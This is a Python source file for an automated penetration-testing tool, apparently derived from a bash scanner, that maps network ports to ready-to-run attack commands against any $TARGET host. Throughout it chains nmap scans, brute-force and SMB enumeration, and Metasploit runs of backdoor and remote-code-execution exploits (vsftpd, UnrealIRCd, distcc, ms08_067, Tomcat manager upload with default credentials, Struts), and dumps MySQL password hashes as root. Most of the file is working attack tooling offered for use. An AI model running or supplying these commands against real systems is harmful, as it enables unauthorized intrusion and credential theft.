# !/usr/bin/env python
#  -*- coding: utf-8 -*-
__author__ = 'xy'

import os
from os.path import exists


class portExploits:
    PORTS = {
        21: ["nmap -sV -sC -p 21 --script=ftp-* $TARGET",
             'msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;'],
        22: ["nmap -sV -sC -T5 -p 22 --script=ssh-* $TARGET",
             'msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$PWD"/BruteX/wordlists/simple-users.txt; setg RHOSTS "$TARGET"; setg "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;'],
        23: ['cisco-torch -A $TARGET',
             'nmap -sV -T5 --script=telnet* -p 23 $TARGET',
             'msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"'],
        25: ['nmap -sV -T5 --script=smtp* -p 25 $TARGET',
             'smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET',
             'msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"'],
        53: ['nmap -sV -T5 --script=dns* -p U:53,T:53 $TARGET'],
        79: ['nmap -sV -T5 --script=finger* -p 79 $TARGET',
             'bin/fingertool.sh $TARGET BruteX/wordlists/simple-users.txt'],
        110: ['nmap -sV -T5 --script=pop* -p 110 $TARGET'],
        111: ['showmount -a $TARGET',
              'showmount -d $TARGET',
              'showmount -e $TARGET'],
        135: ['rpcinfo -p $TARGET',
              'nmap -p 135 -T5 --script=rpc* $TARGET'],
        139: ['enum4linux $TARGET',
              'python $SAMRDUMP $TARGET',
              'nbtscan $TARGET',  # SMB="1"
              'nmap -sV -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET',
              'for a in `cat BruteX/wordlists/snmp-community-strings.txt`; do snmpwalk $TARGET -c $a; done;',
              'msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"'],
        162: ['nmap -p 162 --script=snmp* $TARGET'],
        389: ['nmap -p 389 -T5 --script=ldap* $TARGET'],
        445: ['enum4linux $TARGET',
              'python $SAMRDUMP $TARGET',
              'nbtscan $TARGET',
              'nmap -sV -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET',
              'msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"'],
        512: ['nmap -sV -T5 -p 512 --script=rexec* $TARGET'],
        513: ['map -sV -T5 -p 513 --script=rlogin* $TARGET'],
        514: ['amap $TARGET 514 -A'],
        2049: ['nmap -sV -T5 --script=nfs* -p 2049 $TARGET',
               'rpcinfo -p $TARGET',
               'showmount -e $TARGET',
               'smbclient -L $TARGET -U " "%" "'],
        2121: ['nmap -sV -T5 --script=ftp* -p 2121 $TARGET',
               'msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"'],
        3306: ['nmap -sV --script=mysql* -p 3306 $TARGET',
               "mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'"],
        3310: ['nmap -p 3310 -T5 -sV --script clamav-exec $TARGET'],
        3128: ['nmap -p 3128 -T5 -sV --script=*proxy* $TARGET'],
        3389: ['map -sV -T5 --script=rdp-* -p 3389 $TARGET',
               'rdesktop $TARGET &'],
        3632: ['nmap -sV -T5 --script=distcc-* -p 3632 $TARGET',
               'msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"'],
        5432: ['nmap -sV --script=pgsql-brute -p 5432 $TARGET'],
        5800: ['nmap -sV -T5 --script=vnc* -p 5800 $TARGET'],
        5900: ['nmap -sV -T5 --script=vnc* -p 5900 $TARGET'],
        6000: ['nmap -sV -T5 --script=x11* -p 6000 $TARGET'],
        6667: ['nmap -sV -T5 --script=irc* -p 6667 $TARGET',
               'msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"'],
        10000: [
            'msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"'],
        49152: ['$SUPER_MICRO_SCAN $TARGET']

    }



    # if [ -z "$port_10000" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
    # 	echo -e "$OKGREEN + -- ----------------------------=[Scanning For Common Vulnerabilities]=----- -- +$RESET"
    # 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
    #
    # fi
    #
    # if [ -z "$port_49152" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 49152 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 49152 opened... running tests...$RESET"
    #
    # fi



    # 	if [ "$MODE" = "web" ];
    # 	then
    # 		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
    # 		nmap -sV -T5 -p 80 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
    # 		dirb http://$TARGET
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
    # 		wpscan --url http://$TARGET --batch
    # 		echo ""
    # 		wpscan --url http://$TARGET/wordpress/ --batch
    # 		echo ""
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
    # 		python $CMSMAP -t http://$TARGET
    # 		echo ""
    # 		python $CMSMAP -t http://$TARGET/wordpress/
    # 		echo ""
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running Uniscan Web Vulnerability Scan]=-- -- +$RESET"
    # 		uniscan -u http://$TARGET -qweds
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
    # 		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
    # 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
    # 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 80
    # 	fi
    #
    # 	if [ $SCAN_TYPE == "DOMAIN" ];
    # 	then
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------- -- +$RESET"
    # 		goohak $TARGET > /dev/null
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=---------- -- +$RESET"
    # 		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
    # 		rm -Rf output/ cookie.txt exploits.conf
    # 		GHDB="1"
    # 	fi
    # fi



    # if [ -z "$port_443" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
    # 	echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
    # 	wafw00f https://$TARGET
    # 	echo ""
    # 	echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
    # 	whatweb https://$TARGET
    # 	echo ""
    # 	echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
    # 	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
    # 	sslscan --no-failed $TARGET
    # 	testssl $TARGET
    # 	echo ""
    # 	cd MassBleed
    # 	./massbleed $TARGET port 443
    # 	cd ..
    # 	echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
    # 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I https://$TARGET | egrep -i 'X-Frame' | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I https://$TARGET | egrep -i 'X-XSS' | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking HTTP methods on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I -X OPTIONS https://$TARGET | grep Allow
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I -X TRACE https://$TARGET | grep TRACE
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking for open proxy on $TARGET...$RESET $OKORANGE"
    # 	curl -x https://$TARGET:443 -L https://crowdshield.com/.testing/openproxy.txt -s --insecure | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Enumerating software on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I https://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I https://$TARGET/ | egrep -i "Strict-Transport-Security" | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure https://$TARGET/crossdomain.xml | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure https://$TARGET/clientaccesspolicy.xml | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I https://$TARGET | egrep -i "Access-Control-Allow-Origin" | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Retrieving robots.txt on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure https://$TARGET/robots.txt | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Retrieving sitemap.xml on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure https://$TARGET/sitemap.xml | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking cookie attributes on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure -I https://$TARGET | egrep -i "Cookie:" | tail -n 10
    # 	echo ""
    # 	echo -e "$OKBLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...$RESET $OKORANGE"
    # 	curl -s --insecure https://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10
    # 	curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
    # 	echo ""
    # 	echo -e "$RESET"
    # 	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
    # 	nikto -h https://$TARGET
    # 	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
    # 	cutycapt --url=https://$TARGET --out=loot/$TARGET-port443.jpg
    # 	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port443.jpg"
    #
    # 	if [ "$MODE" = "web" ];
    # 	then
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
    # 		nmap -sV -T5 -p 443 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
    # 		dirb https://$TARGET
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
    # 		wpscan --url https://$TARGET --batch
    # 		echo ""
    # 		wpscan --url https://$TARGET/wordpress/ --batch
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
    # 		python $CMSMAP -t https://$TARGET
    # 		echo ""
    # 		python $CMSMAP -t https://$TARGET/wordpress/
    # 		echo ""
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running Uniscan Web Vulnerability Scan]=-- -- +$RESET"
    # 		uniscan -u https://$TARGET -qweds
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
    # 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
    # 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
    # 		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
    # 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 443 --ssl
    # 	fi
    #
    # 	if [ $SCAN_TYPE == "DOMAIN" ];
    # 	then
    # 		if [ -z $GHDB ];
    # 		then
    # 			echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=---------- -- +$RESET"
    # 			goohak $TARGET > /dev/null
    # 			echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=----------- -- +$RESET"
    # 			php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
    # 			rm -Rf output/ cookie.txt exploits.conf
    # 		fi
    # 	fi
    # fi
    #



    # if [ -z "$port_8000" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 8000 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 8000 opened... running tests...$RESET"
    # 	wafw00f http://$TARGET:8000
    # 	echo ""
    # 	whatweb http://$TARGET:8000
    # 	echo ""
    # 	xsstracer $TARGET 8000
    # 	cd ..
    # 	nikto -h http://$TARGET:8000
    # 	cutycapt --url=http://$TARGET:8000 --out=loot/$TARGET-port8000.jpg
    # fi
    #
    # if [ -z "$port_8100" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 8100 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 8100 opened... running tests...$RESET"
    # 	wafw00f http://$TARGET:8100
    # 	echo ""
    # 	whatweb http://$TARGET:8100
    # 	echo ""
    # 	xsstracer $TARGET 8100
    # 	sslscan --no-failed $TARGET:8100
    # 	cd MassBleed
    # 	./massbleed $TARGET port 8100
    # 	cd ..
    # 	nikto -h http://$TARGET:8100
    # 	cutycapt --url=http://$TARGET:8100 --out=loot/$TARGET-port8100.jpg
    # fi
    #
    # if [ -z "$port_8080" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 8080 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 8080 opened... running tests...$RESET"
    # 	wafw00f http://$TARGET:8080
    # 	echo ""
    # 	whatweb http://$TARGET:8080
    # 	echo ""
    # 	xsstracer $TARGET 8080
    # 	sslscan --no-failed $TARGET:8080
    # 	cd MassBleed
    # 	./massbleed $TARGET port 8080
    # 	cd ..
    # 	nikto -h http://$TARGET:8080
    # 	cutycapt --url=http://$TARGET:8080 --out=loot/$TARGET-port8080.jpg
    # 	nmap -p 8080 -T5 --script=*proxy* $TARGET
    # 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
    # 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
    # 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
    # 	python jexboss/jexboss.py http://$TARGET:8080
    # 	python jexboss/jexboss.py https://$TARGET:8080
    # fi
    #



    # fi
    #
    # if [ -z "$port_8180" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 8180 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 8180 opened... running tests...$RESET"
    # 	wafw00f http://$TARGET:8180
    # 	echo ""
    # 	whatweb http://$TARGET:8180
    # 	echo ""
    # 	xsstracer $TARGET 8180
    # 	sslscan --no-failed $TARGET:8180
    # 	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8180
    # 	cd MassBleed
    # 	./massbleed $TARGET port 8180
    # 	cd ..
    # 	nikto -h http://$TARGET:8180
    # 	cutycapt --url=http://$TARGET:8180 --out=loot/$TARGET-port8180.jpg
    # 	nmap -p 8180 -T5 --script=*proxy* $TARGET
    # 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
    # 	echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
    # 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
    # fi
    #
    # if [ -z "$port_8443" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 8443 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 8443 opened... running tests...$RESET"
    # 	wafw00f http://$TARGET:8443
    # 	echo ""
    # 	whatweb http://$TARGET:8443
    # 	echo ""
    # 	xsstracer $TARGET 8443
    # 	sslscan --no-failed $TARGET:8443
    # 	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8443
    # 	cd MassBleed
    # 	./massbleed $TARGET port 8443
    # 	cd ..
    # 	nikto -h https://$TARGET:8443
    # 	cutycapt --url=https://$TARGET:8443 --out=loot/$TARGET-port8443.jpg
    # 	nmap -p 8443 -T5 --script=*proxy* $TARGET
    # fi
    #
    # if [ -z "$port_8888" ];
    # then
    # 	echo -e "$OKRED + -- --=[Port 8888 closed... skipping.$RESET"
    # else
    # 	echo -e "$OKORANGE + -- --=[Port 8888 opened... running tests...$RESET"
    # 	wafw00f http://$TARGET:8888
    # 	echo ""
    # 	whatweb http://$TARGET:8888
    # 	echo ""
    # 	xsstracer $TARGET 8888
    # 	nikto -h http://$TARGET:8888
    # 	cutycapt --url=https://$TARGET:8888 --out=loot/$TARGET-port8888.jpg
    # fi
    #


"""

80: ['wafw00f http://$TARGET',
             'whatweb http://$TARGET',
             'xsstracer $TARGET 80',
             "curl -s --insecure -I http://$TARGET | egrep -i 'X-Content' | tail -n 10",
             "curl -s --insecure -I http://$TARGET | egrep -i 'X-Frame' | tail -n 10",
             "curl -s --insecure -I http://$TARGET | egrep -i 'X-XSS' | tail -n 10",
             "curl -s --insecure -I -X OPTIONS http://$TARGET | grep Allow | tail -n 10",
             "curl -s --insecure -I -X TRACE http://$TARGET | grep TRACE | tail -n 10",
             "curl -s --insecure -x http://$TARGET:80 -L http://crowdshield.com/.testing/openproxy.txt | tail -n 10",
             'curl -s --insecure -I http://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10',
             "curl -s --insecure -I http://$TARGET/ | egrep -i \"Strict-Transport-Security\" | tail -n 10",
             'curl -s --insecure http://$TARGET/crossdomain.xml | tail -n 10',
             'curl -s --insecure http://$TARGET/clientaccesspolicy.xml | tail -n 10',
             'curl -s --insecure -I http://$TARGET | egrep -i "Access-Control-Allow-Origin" | tail -n 10',
             'curl -s --insecure http://$TARGET/robots.txt | tail -n 10',
             'curl -s --insecure http://$TARGET/sitemap.xml | tail -n 10',
             'curl -s --insecure -I http://$TARGET | egrep -i "Cookie:" | tail -n 10',
             "curl -s --insecure http://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10",
             "curl -s --insecure http://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10",
             "nikto -h http://$TARGET",
             "cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg"],

"""
